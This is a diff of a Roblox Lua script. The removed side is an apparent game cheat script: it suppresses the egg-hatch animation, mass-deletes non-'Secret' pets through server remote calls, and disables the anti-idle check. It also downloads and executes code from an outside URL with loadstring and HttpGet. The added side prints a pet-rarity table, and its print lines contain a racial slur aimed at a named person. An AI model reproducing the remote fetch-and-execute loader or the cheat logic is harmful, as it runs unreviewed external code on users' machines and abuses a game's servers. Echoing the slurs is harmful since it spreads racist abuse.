@@ -1,135 +1,66 @@
-local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
-
-local Network = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
-local LocalData = require(ReplicatedStorage.Client.Framework.Services.LocalData)
 local PetsModule = require(ReplicatedStorage.Shared.Data.Pets)
 
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "NewSecretsUI"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = PlayerGui
+local TARGET_EGG = "New Years Egg"
 
-local Frame = Instance.new("Frame")
-Frame.Size = UDim2.fromOffset(200,200)
-Frame.Position = UDim2.fromScale(0.5,0.5) - UDim2.fromOffset(100,100)
-Frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
-Frame.BorderSizePixel = 0
-Frame.Parent = ScreenGui
-
-Instance.new("UICorner",Frame).CornerRadius = UDim.new(0,12)
-
-local Text = Instance.new("TextLabel")
-Text.Size = UDim2.fromScale(1,1)
-Text.BackgroundTransparency = 1
-Text.TextWrapped = true
-Text.TextScaled = true
-Text.Font = Enum.Font.GothamBold
-Text.TextColor3 = Color3.new(1,1,1)
-Text.Text = ""
-Text.Parent = Frame
-
-local knownSecrets = {}
-local newSecrets = {}
-
-do
-    local data = LocalData:Get()
-    if data and data.Pets then
-        for _, pet in pairs(data.Pets) do
-            local info = PetsModule[pet.Name]
-            if info and info.Rarity == "Secret" then
-                knownSecrets[pet.Name] = true
-            end
+local function getDenominator(info)
+    if info.DisplayChance then
+        local v = tonumber(info.DisplayChance)
+        if v then
+            if v < 1 then return 1 / v end
+            return v
         end
+    end
+    if info.DisplayChanceText then
+        local num = info.DisplayChanceText:match("1%s*/%s*([%d,]+)")
+        if num then
+            return tonumber(num:gsub(",", ""))
+        end
+    end
+    if info.Chance then
+        local v = tonumber(info.Chance)
+        if v then
+            if v < 1 then return 1 / v end
+            return v
+        end
+    end
+    return nil
+end
+
+local function formatShort(n)
+    if n >= 1e9 then
+        return "1/" .. tostring(math.floor(n / 1e9)) .. "b"
+    elseif n >= 1e6 then
+        return "1/" .. tostring(math.floor(n / 1e6)) .. "m"
+    elseif n >= 1e3 then
+        return "1/" .. tostring(math.floor(n / 1e3)) .. "k"
+    else
+        return "1/" .. tostring(math.floor(n))
     end
 end
-require(game:GetService("ReplicatedStorage").Client.Effects.HatchEgg).Play = function() return end
-task.spawn(function()
-    while true do
-        local data = LocalData:Get()
-        if data and data.Pets then
-            for _, pet in pairs(data.Pets) do
-                local info = PetsModule[pet.Name]
-                if info and info.Rarity == "Secret" and not knownSecrets[pet.Name] then
-                    knownSecrets[pet.Name] = true
-                    table.insert(newSecrets, pet.Name)
-                    Text.Text = table.concat(newSecrets, "\n")
-                    Frame.BackgroundColor3 = Color3.fromRGB(180,0,0)
-                end
-            end
-        end
-        task.wait(1)
-    end
-end)
 
-local function deleteAllNonSecrets()
-    local data = LocalData:Get()
-    if not data or not data.Pets then return end
-    for _, pet in pairs(data.Pets) do
-        local info = PetsModule[pet.Name]
-        if not (info and info.Rarity == "Secret") then
-            for _, amt in ipairs({100,10,1}) do
-                Network:FireServer("DeletePet", pet.Id, amt, false)
-                task.wait(0.05)
-            end
+local list = {}
+
+for name, info in pairs(PetsModule) do
+    if type(info) == "table" and info.Egg == TARGET_EGG then
+        local denom = getDenominator(info)
+        if denom then
+            denom = denom * 100
+            table.insert(list, {
+                Name = name,
+                Rarity = info.Rarity,
+                Denom = denom
+            })
         end
     end
 end
 
-task.spawn(function()
-    local lastCount
-    local lastChange = tick()
-    while true do
-        local data = LocalData:Get()
-        local count = 0
-        if data and data.Powerups then
-            for name, amt in pairs(data.Powerups) do
-                if name:match("Egg") and amt > 0 then
-                    count += amt
-                end
-            end
-        end
-        if lastCount ~= count then
-            lastCount = count
-            lastChange = tick()
-        end
-        if count > 0 and tick() - lastChange >= 60 then
-            deleteAllNonSecrets()
-            lastChange = tick()
-        end
-        task.wait(2)
-    end
+table.sort(list, function(a, b)
+    return a.Denom > b.Denom
 end)
 
-task.spawn(function()
-    _G.Config={UserID="3087df52-2f5c-4e6f-a407-10fa72d16932",discord_id="1135837863603351573",Note="Pc"}
-    local s
-    for i=1,5 do
-        s=pcall(function()
-            loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/bgsi"))()
-        end)
-        if s then break end
-        task.wait(5)
-    end
-    for _, x in pairs(getconnections(Players.LocalPlayer.Idled)) do
-        x:Disable()
-    end
-    local data = LocalData:Get()
-    task.spawn(function()
-        for Item, Amount in pairs(data.Powerups) do
-            if Item:match("Egg") then
-                if Amount > 12 then
-                    local Times = math.floor(Amount / 12)
-                    for i = 1, Times do
-                        Network:FireServer("HatchPowerupEgg", Item, 12)
-                        task.wait(0.75)
-                    end
-                    task.wait(2)
-                elseif Amount > 0 then
-                    Network:FireServer("HatchPowerupEgg", Item, Amount)
-                end
-            end
-        end
-    end)
-end)
+print("malik nigger rarity generator")
+for _, pet in ipairs(list) do
+    print(pet.Name .. " : " .. tostring(pet.Rarity) .. " : " .. formatShort(pet.Denom))
+end
+print("you are such a nigger gen")
